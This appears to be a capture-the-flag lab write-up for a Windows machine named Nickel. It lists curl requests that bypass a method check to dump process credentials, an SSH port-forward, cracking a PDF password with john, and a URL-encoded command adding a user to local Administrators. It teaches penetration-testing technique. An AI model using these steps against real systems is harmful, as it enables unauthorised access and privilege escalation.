#Windows #HTTPVerbTampering #ProcessDump #Base64 #SSHTunnel #PDFCrack #CommandInjection #LocalAdminAdd

## Overview

Nickel is a Windows machine where the foothold comes from abusing a misconfigured internal DevOps API that leaks running process command lines, including a plaintext base64-encoded password in a process argument. That credential yields SSH access, and from there the path to SYSTEM routes through an internal web service that executes commands as `NT AUTHORITY\SYSTEM`, used to add the low-privilege user directly to the local Administrators group.

## Recon

### Nmap

```sh
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd
22/tcp   open  ssh           OpenSSH for_Windows_8.1
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8089/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Port 8089 stood out, an HTTPAPI endpoint without an obvious label. Port 80 returned no title.

### Port 8089, DevOps Dashboard

Browsing to port 8089 revealed a "DevOps Dashboard" with three buttons: List Current Deployments, List Running Processes, and List Active Nodes. All three hung when clicked.

Checking the page source explained why:

```html
<form action='http://169.254.129.94:33333/list-running-procs' method='GET'>
```

The buttons submitted requests to an APIPA address (169.254.x.x) on port 33333, a link-local address unreachable from the internet. The endpoints actually exist on the real machine IP, port 33333.

## Foothold

### HTTP Verb Tampering, Process List Disclosure

Querying the endpoint directly with GET returned a 403:

```sh
curl -X GET http://192.168.176.99:33333/list-running-procs
<p>Cannot "GET" /list-running-procs</p>
```

Switching to POST without a body returned a 411 (Length Required):

```sh
curl -X POST http://192.168.176.99:33333/list-running-procs
HTTP Error 411. The request must be chunked or have a content length.
```

Adding `Content-Length: 0` satisfied the requirement and returned the full running process list:

```sh
curl -X POST http://192.168.176.99:33333/list-running-procs -H 'Content-Length: 0'
```

One process line in the output contained credentials:

```
name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml
              --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev
              --protocol ssh
```

> **Why process command lines leak secrets:** on Windows, `commandline` arguments passed to processes are visible to any user who can enumerate processes. Scripts and scheduled tasks often pass credentials as arguments for convenience, and those arguments sit in plain view in the process list. An attacker who can read the running process table gets those secrets for free.

Decoding the base64 argument:

```sh
echo 'Tm93aXNlU2xvb3BUaGVvcnkxMzkK' | base64 -d
‹redacted›
```

Credentials:

```
ariah : ‹redacted›
```

SSH access:

```
Microsoft Windows [Version 10.0.18362.1016]
ariah@NICKEL C:\Users\ariah>
```

### Decrypting the PDF, Internal API Discovery

Port 80 was not externally reachable, but from the SSH session it was accessible locally. An SSH port-forward tunneled it to Kali:

```sh
ssh -f -N -L 127.0.0.1:8080:127.0.0.1:80 ariah@192.168.176.99
```

Browsing `127.0.0.1:8080` showed: `dev-api started at 2024-02-17T05:47:37`.

The FTP server at port 21 had an `/ftp` directory containing `Infrastructure.pdf`, which was password-protected. Using `pdf2john` and rockyou:

```sh
pdf2john Infrastructure.pdf > pdf.john
john pdf.john --wordlist=/usr/share/wordlists/rockyou.txt
ariah4168         (Infrastructure.pdf)
```

The PDF content:

```
Infrastructure Notes
Temporary Command endpoint: http://nickel/?
Backup system: http://nickel-backup/backup
NAS: http://corp-nas/files
```

## Privilege Escalation

### Internal SYSTEM Command Endpoint

The "Temporary Command endpoint" note was literal. Testing it via the SSH tunnel:

```
http://127.0.0.1:8080/?whoami
```

Response:

```
dev-api started at 2024-02-17T05:47:37
nt authority\system
```

> **What makes this escalation clean:** the internal HTTP service executes whatever is passed in the query string as an OS command and runs as `NT AUTHORITY\SYSTEM`. No shell needed, just URL-encoded PowerShell. Rather than dropping a reverse shell (which would require additional tooling on the target), the winning move was to use the command endpoint to add the current user directly to the local Administrators group.

Adding `ariah` to Administrators via the SYSTEM API endpoint:

```sh
curl 'http://localhost:8080/?Add-LocalGroupMember%20-Group%20Administrators%20-Member%20ariah'
```

After reconnecting via SSH, `whoami /priv` showed the full administrator privilege set, including `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeImpersonatePrivilege`.

## Root / SYSTEM

With ariah now in the local Administrators group, the proof flag was readable directly:

```powershell
ariah@NICKEL C:\Users\Administrator\Desktop>type proof.txt
‹redacted›
```

## Takeaways

- **HTTP verb tampering is a quick win before reaching for heavy tools.** A GET-blocked endpoint that accepts POST with `Content-Length: 0` is indistinguishable from a GET to the application logic, but the server's method check gates access. One header change bypassed the restriction entirely.
- **Command-line arguments are plaintext secrets.** Any credential passed as a `--password` or `-p` argument is readable from the process table. Scheduled tasks, deployment scripts, and dev tooling are the most common offenders.
- **SSH port-forwarding reaches internal-only services.** Once you have SSH creds, `-L` tunneling makes any localhost-bound service on the target reachable from Kali. This unlocked both the internal API and the FTP PDF.
- **A SYSTEM-level command endpoint is faster than a shell.** Instead of dropping a payload and catching a callback, a single `curl` call with a URL-encoded PowerShell command added the user to Administrators permanently.
